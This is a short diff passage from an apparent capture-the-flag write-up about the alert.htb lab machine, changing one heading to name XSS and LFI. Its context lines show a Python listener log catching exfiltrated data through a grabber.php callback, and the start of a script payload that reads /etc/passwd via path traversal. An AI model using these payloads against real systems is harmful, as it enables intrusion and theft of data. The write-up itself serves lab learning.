@@ -171,7 +171,7 @@ $ python3 -m http.server 8888
 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 10.10.11.44 - - [06/Jan/2025 00:02:00] "GET /grabber.php?c=%27+document.domain&lt;/script&gt; HTTP/1.1" 200 -
 ```
-### Vulnerability Identification
+### Vulnerability Identification (XSS, LFI)
 ```js
 <script>
 fetch("http://alert.htb/messages.php?file=../../../../etc/passwd")
